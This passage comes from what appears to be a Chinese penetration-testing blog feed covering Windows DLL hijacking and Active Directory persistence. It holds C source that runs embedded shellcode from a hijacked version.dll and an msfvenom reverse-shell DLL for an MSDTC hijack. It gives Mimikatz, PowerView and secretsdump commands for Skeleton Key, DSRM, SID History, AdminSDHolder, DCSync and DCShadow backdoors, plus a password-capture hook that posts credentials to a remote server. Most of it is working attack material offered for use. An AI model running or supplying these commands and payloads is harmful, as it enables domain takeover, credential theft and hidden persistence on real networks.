class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><br><span class="hljs-comment">//申请内存并执行ShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 入口函数</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br>DisableThreadLibraryCalls(hModule);<br>        HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用Visual Studio创建DLL项目进行编译，以生成恶意的version.dll</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418224137630.png" alt="image-20240418224137630"></p><p>然后将生成的恶意dll放入Navicat安装目录即可，不过后期这些应该都要做免杀才行，本地生成立马就拦了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418224240983.png" alt="image-20240418224240983"></p><p><strong>劫持系统服务</strong></p><p>MSDTC(Distributed Transaction Coordinator，分布式事务处理协调器)是 Windows系统服务，负责协调跨多个数据库、消息队列、文件系统等资源管理器的事务。</p><p>MSDTC 服务启动后，将尝试在C:\Windows\System32目录中加载oci.dll 文件，但是该文件不存在</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417183948223.png" alt="image-20240417183948223"></p><p>测试人员可以制作一个同名的恶意DLL并放入System32目录。当MSDTC服务启动时，恶意DLL将加载到msdtc.exe进程。</p><p>可以用Metasploit直接生成一个恶意DLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p Windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o oci.dll<br></code></pre></td></tr></table></figure><p>生成一个oci.dll文件然后上传到C:\Windows\System32目录下，当系统服务重启时，目标主机就会重新上线，并且权限为NETWORK SERVICE。</p><p>在某些版本中MSDTC服务的启动类型默认为”手动”，我们可以修改为自动实现权限持久化</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config msdtc start= &quot;auto&quot;<br></code></pre></td></tr></table></figure><h1 id="常见域后门技术"><a href="#常见域后门技术" class="headerlink" title="常见域后门技术"></a>常见域后门技术</h1><p>当获取域控制器的权限后，为了防止对域控制器权限的丢失，测试人员需要使用些特定的持久化技术来维持已获取到的域权限。</p><h2 id="创建Skeleton-Key域后门"><a href="#创建Skeleton-Key域后门" class="headerlink" title="创建Skeleton Key域后门"></a>创建Skeleton Key域后门</h2><p>Skeleton Key 即“万能钥匙”。通过在域控制器上安装 Skeleton Key，所有域用户账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入lsass.exe 进程实现，创建的 Skeleton Key 仅保留在内存中，如果域控重启，Skeleton Key就会失效。利用该技术需要拥有域管理员级别的权限。</p><p><strong>常规利用</strong></p><p>将Mimikatz上传到域控，执行下面命令创建Skeleton Key后门</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::seleton&quot; exit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417190149716.png" alt="image-20240417190149716"></p><p>执行后，，将为所有的域账户设置一个相同的密码”mimikatz”，从而可以登录域控。</p><p><strong>缓解措施</strong></p><p>微软在2014年3月添加了LSA(Local Security Authority,本地安全机构)保护策略用来防止对lsass.exe 进程的内存读取和代码注入。通过执行以下命令，可以开启或关闭LSA 保护。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启LSA保护策略</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭LSA保护策略</span><br>reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL<br></code></pre></td></tr></table></figure><p>重启系统后，Mimikatz的相关操作都会失败。此时即使已经获取了Debug权限也无法读取用户哈希值，更无法安装SkeletonKey.</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417195040956.png" alt="image-20240417195040956"></p><p>不过，Mimikatz在2013年就已经支持绕过LSA保护，该功能需要Mimikatz项目中的mimidrv.sys驱动文件，Skeleton Key的安装命令就变成如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz # privilege::debug<br>mimikatz # !+<br>mimikatz # !processprotect /process:lsass.exe /remove<br>mimikatz # misc::skeleton<br></code></pre></td></tr></table></figure><h2 id="创建DSRM域后门"><a href="#创建DSRM域后门" class="headerlink" title="创建DSRM域后门"></a>创建DSRM域后门</h2><p>DSRM(Directory Services Restore Mode，目录服务还原模式)是域控制器的安全模式启动选项，用于使服务器脱机，以进行紧急维护。在初期安装 Windows 域服务时，安装向导会提示用户设置 DSRM 的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。</p><p>在域控上DSRM账户实际上就是本地管理员账户。通过在域控上运行NTDSUtil(是一个自带的用于管理和维护活动目录的工具)，可以为DSRM账户修改密码，步骤如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">进入ntdsutil</span><br>ntdsutil<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入设置DSRM账户密码设置模式</span><br>set dsrm password<br><span class="hljs-meta prompt_"># </span><span class="language-bash">在当前域控上恢复DSRM密码</span><br>reset password on server null<br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入新密码</span><br>&lt;password&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出DSRM密码设置模式</span><br>q<br><span class="hljs-meta prompt_"># </span><span class="language-bash">退出ntdsutil</span><br>q<br></code></pre></td></tr></table></figure><p>测试人员可以通过修改 DSRM 账户的密码，以维持对域控制器权限。该技术适用于Windows Server 2008 及以后版本的服务器，并需要拥有域管理员级别的权限。</p><p>下面是Mimikatz的利用过程</p><ol><li><p>读取SAM文件获取DSRM账户的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>修改DSRM的登陆模式，允许该账户的远程登陆。可以通过编辑注册表的 DsrmAdminLogonBehavior 键值来实现，可选用的登录模式有以下3种。</p><p>0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。</p><p>1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器。</p><p>2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器。</p><p>所以我们就要修改登陆模式为2：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f<br></code></pre></td></tr></table></figure></li><li><p>然后就可以通过DSRM账号对域控进行控制了。我们可以根据上面获得的哈希对域控执行哈希传递攻击获取域控权限</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418230425352.png" alt="image-20240418230425352"></p></li></ol><h2 id="SID-History的利用"><a href="#SID-History的利用" class="headerlink" title="SID History的利用"></a>SID History的利用</h2><p><strong>SID &amp; SID History</strong></p><p>在 Windows 系统中，SID(Security Identifiers)是指安全标识符，是用户、用户组或其他安全主体的唯一、不可变标识符。</p><p>Windows 根据 ACL(访问控制列表)授予或拒绝对资源的访问和特权，ACL 使用SID 来唯一标识用户及其组成员身份。当用户登录到计算机时，会生成一个访问令牌其中包含用户和组 SID和用户权限级别。当用户请求访问资源时，将根据 ACL 检查访问令牌以允许或拒绝对特定对象的特定操作。</p><p>SID History 是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户，这在域迁移过程中非常有用。例如，当Domain A 中的用户迁移到Domain B 时，会在 Domain B中创建一个新的用户账户，并将Domain A用户的 SID 添加到 DomainB 的用户账户的 SID History属性中。这就确保了 DomainB用户仍然拥有访问 DomainA 中资源的权限。</p><p><strong>利用方法</strong></p><p>测试人员可以将域管理员用户的SID添加到其他域用户的SID History属性中，以此建立一个隐蔽的域后门，该方法需要拥有域管理员级别的权限。</p><p>以创建用户Hacker为例：</p><ol><li><p>上传mimikatz执行以下命令将域管理员的SID添加到Hacker用户的SID History属性中</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &gt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam::Hacker /new:Administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &lt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418231321732.png" alt="image-20240418231321732"></p></li><li><p>PowerShell查看Hacker用户的属性：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module ActiveDirectory<br>Get-ADUser Hacker -Properties SIDHistory<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418231512445.png" alt="image-20240418231512445"></p><p>可以发现Hacker用户已经继承了权限</p></li><li><p>然后就可以通过Hacker用户成功连接到域控制器，执行<strong>whoami &#x2F;priv</strong>可以看到拥有域管理员的所有特权</p></li></ol><h2 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h2><p><strong>AdminSDHolder</strong></p><p>AdminSDHolder 是一个特殊的 Active Directory 容器对象,位于 Domain CN 的 System容器下。AdminSDHolder 通常作为系统中某些受保护对象的安全模板，以防止这些对象遭受恶意修改或滥用。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240418231838646.png" alt="image-20240418231838646"></p><p>受保护对象通常包括系统的特权用户和重要的组,如 Administrator、Domain Admins、Enterprise Admins 以及Schema Admins 等。</p><p>在活动目录中，属性 adminCount用来标记特权用户和组。对于特权用户和组来说，该属性值被设为 1。通过 AdFind 查询 adminCount 属性设置为1的对象，可以找到所有受 AdminSDHolder 保护的特权用户和组</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">枚举受保护的用户</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=person)(amaccountname=*)(admincount=1)&quot; -dn<br><span class="hljs-meta prompt_"># </span><span class="language-bash">枚举受保护的组</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419000448192.png" alt="image-20240419000448192"></p><p>在默认情况下，系统将定期(每 60分钟)检查受保护对象的安全描述符，将受保护对象的 ACL 与 AdminSDHolder 容器的 ACL 进行比较，如果二者不一致，系统就会将受保护对象的 ACL 强制修改为 AdminSDHolder 容器的 ACL。该工作通过 SDProp 进程来完成，该进程以 60分钟为一个工作周期。</p><p><strong>利用方法</strong></p><p>在实战中,测试人员可以篡改 AdminSDHolder 容器的 ACL 配置。当系统调用 SDProp进程执行相关工作时，被篡改的 ACL 配置将同步到受保护对象的 ACL 中，以此建立一个隐蔽的域后门。利用该技术需要拥有域管理员级别的权限</p><p>执行以下命令，通过 PowerView 向 AdminSDHolder 容器对象添加一个 ACL，使普通域用户 Marcus 拥有对 AdminSDHolder 的“完全控制”权限，项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\PowerView.ps1<br>Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,Dc=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose<br></code></pre></td></tr></table></figure><p>执行后,Marcus用户成功拥有AdminSDHolder容器对象的完全控制权限。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419001254688.png" alt="image-20240419001254688"></p><p>等待 60分钟后，Marcus 用户将获得对系统中的特权用户和组完全控制权限。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419001334730.png" alt="image-20240419001334730"></p><p>要清除对AdminSDHolder的完全控制权限，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus Rights All -Verbose<br></code></pre></td></tr></table></figure><h2 id="HOOk-PasswordChangeNotify"><a href="#HOOk-PasswordChangeNotify" class="headerlink" title="HOOk PasswordChangeNotify"></a>HOOk PasswordChangeNotify</h2><p>PasswordChangeNotify 在微软官方文档中的名称为PsamPasswordNotificationRoutine,是一个 WindowS API。当用户重置密码时，Windows会先检查新密码是否符合复杂性要求，如果密码符合要求，LSA 会调用PasswordChangeNotify函数在系统中同步密码。该函数的语法大致如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419002150589.png" alt="image-20240419002150589"></p><p>当调用 PasswordChangeNotify 时，用户名和密码将以明文的形式传入。测试人员可以通过 HOOK 技术，劫持PasswordChangeNotify 函数的执行流程，从而获取传入的明文密码。</p><p>其流程大致如下，需要的工具有：HookPasswordChange.dll(项目地址：<a href="https://github.com/clymb3r/Misc-Windows-Hacking)%E5%92%8CInvoke-ReflectivePEInjection.ps1(%E4%BD%8D%E4%BA%8EPowerSploit%E9%A1%B9%E7%9B%AE%E7%9A%84CodeExecution%E7%9B%AE%E5%BD%95%E4%B8%8B)">https://github.com/clymb3r/Misc-Windows-Hacking)和Invoke-ReflectivePEInjection.ps1(位于PowerSploit项目的CodeExecution目录下)</a></p><ol><li><p>将HookPasswordChange.dll和Invoke-ReflectivePEInjection.ps1上传到域控，并将HookPasswordChange.dl注入到lsass.exe进程</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入Invoke-ReflectivePEInjection.ps1</span><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-ReflectivePEInjection</span>.ps1<br><span class="hljs-comment"># 读取HookPasswordChange.dll并将其注入到lsass进程</span><br><span class="hljs-variable">$PEBytes</span> = [<span class="hljs-type">IO.File</span>]::ReadAllBytes(<span class="hljs-string">&#x27;C:\Users\Administrator\HookPasswordChange.dll&#x27;</span>)<br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$PEBytes</span> <span class="hljs-literal">-ProcName</span> lsass<br></code></pre></td></tr></table></figure></li><li><p>当网络管理员修改用户密码时，用户的新密码将记录在C:\Windows\Temp 目录的passwords.txt 文件中</p><p>password.txt保存的目录还可以自定义，需要在HookPasswordChange.cpp文件中修改</p></li></ol><p>为了将获取的用户密码传回远程服务器，在源码的基础上可以通过WinNet API添加HTTP请求功能，代码大致如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419004013067.png" alt="image-20240419004013067"></p><p>原本github上面有项目但是不见了，到时候有机会再自己改（</p><p>修改后重新编译生成HookPasswordChange.dll，当管理员修改密码时就可以通过post方法将密码带到远程服务器</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419004224553.png" alt="image-20240419004224553"></p><h1 id="DCSync攻击技术"><a href="#DCSync攻击技术" class="headerlink" title="DCSync攻击技术"></a>DCSync攻击技术</h1><p>一个域环境可以拥有多台域控制器，每台域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源域控制器同步到本域、域树或域林中的其他域控制器上。当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送 DSGetNCChanges 请求，该请求的响应将包含客户端域控必须应用到其活动目录副本的一组更新。通常情况下，域控制器之间每 15 分钟就会有一次域数据同步。</p><p>DCSync 技术就是利用域控制器同步的原理,通过Directory Replication Service(DRS服务的 IDL_DRSGetNCChanges 接口向域控发起数据同步请求。在 DCSync 出现前，要获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取NTDS.dit 文件。利用 DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。注意，DCSync攻击不适用于只读域控制器(RODC)</p><p>在默认情况下，只有Administrators、Domain Controllers 和Enterprise Domain Admins组内的用户和域控制器的机器账户才有执行DCSync操作的权限。</p><h2 id="利用DCSync导出域内哈希"><a href="#利用DCSync导出域内哈希" class="headerlink" title="利用DCSync导出域内哈希"></a>利用DCSync导出域内哈希</h2><p><strong>Mimikatz下的利用</strong></p><p>执行下面命令导出域内用户信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出域内指定用户的信息，包括哈希值</span><br>mimkatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hacky-my\administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">导出域内所有用户的信息，包括哈希值</span><br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit<br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419005028742.png" alt="image-20240419005028742"></p><p>一般来说，域管理员权限的用户以及 Krbtgt 用户的哈希是有价值的。通过域管理员的哈希进行哈希传递可以直接获取服务器控制权，而Krbtgt用户的哈希可以用来制作黄金票据，实现票据传递攻击。</p><p><strong>Impacket下的利用</strong></p><p>Impacket项目中的secretsdump.py脚本支持通过 DCSync 技术导出域控制器中用户哈希。该工具可以使用提供的高权限用户的登录凭据，从未加入域的系统上远程连接至域控制器，并从注册表中导出本地账户的哈希值，同时通过 Dcsync 或卷影复制的方法NTDS.dit 文件中导出所有域用户的哈希值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py hack-my.com/administrator:Admin\@123@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">10.10.10.11为域控的IP</span><br></code></pre></td></tr></table></figure><h2 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h2><p>在获取域管理员权限后，测试人员可以手动为域内标准用户赋予 DCSync 操作的权限，从而实现隐蔽的域后门。只需为普通域用户添加表所示的两条扩展权限即可。</p><table><thead><tr><th>CN</th><th>displayName</th><th>rightsGuid</th></tr></thead><tbody><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes</td><td>1131f6aa-9c07-11d1-f79f-00c04fc2ded2</td></tr><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes All</td><td>1131f6ad-9c07-11d1-f79f-00c04fc2ded2</td></tr></tbody></table><p>可以通过PowerShell渗透框架下的PowerView.ps1脚本实现。执行以下命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-comment"># 为域用户Marcus添加DCSync权限</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p>如果要清除权限则执行下面命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><h2 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h2><p>DCShadow 通过创建恶意的域控制器，利用域控之间的数据同步复制，将预先设定的对象或对象属性注入正在运行的合法域控制器，以此来创建域后门或者获取各种类型的非法访问渠道。</p><p>相关原理参考文章：<a href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/">https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</a></p><p>下面通过 DCShadow修改普通域用户Marcus的primaryGroupID属性演示 DCShadow的攻击过程。该属性指向用户所属的主要组的RID，通过将用户的 primaryGroupID 改为 512，可以让用户成为域管理员。RID 指相对标识符，是 SID 的组成部分，位于 SID 字符串的末端。Windows系统使用RID来区分用户账户和组，常见系统账户的 RID 如表：</p><table><thead><tr><th>组</th><th>RID</th></tr></thead><tbody><tr><td>Administrator</td><td>500</td></tr><tr><td>Guest</td><td>501</td></tr><tr><td>Kribtgt</td><td>502</td></tr><tr><td>Domain Admins</td><td>512</td></tr><tr><td>Domain Users</td><td>513</td></tr><tr><td>Domain Guests</td><td>514</td></tr><tr><td>Domain Computers</td><td>515</td></tr><tr><td>Domain Controllers</td><td>516</td></tr><tr><td>Schema Admins</td><td>518</td></tr><tr><td>Enterprise Admins</td><td>519</td></tr></tbody></table><p>攻击流程如下：</p><ol><li><p>上传Mimikatz到主机，在拥有SYSTEM权限下执行下面命令来创建恶意域控</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /object:CN=Marcus,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>执行后第一个命令行窗口不关闭，新开一个域管理员权限的命令行窗口，然后执行下面命令强制触发域复制，将数据更改推送至合法域控</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit<br></code></pre></td></tr></table></figure></li></ol><p>此时，Marcus用户的primaryGroupID属性已成功被修改为512，并且Marcus 已经是域管理员组中的用户了。</p><p>可以用该命令来查看域管理员组用户来验证：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group  &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p>DCShadow 使得测试人员可以直接修改活动目录数据库中的对象。在域防护比较严格的情况下，可以通过 DCShadow操纵 SID History、Krbtgt 账户的密码，或将用户添加到特权组，以实现域权限持久化。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h1>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息搜集常用工具</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
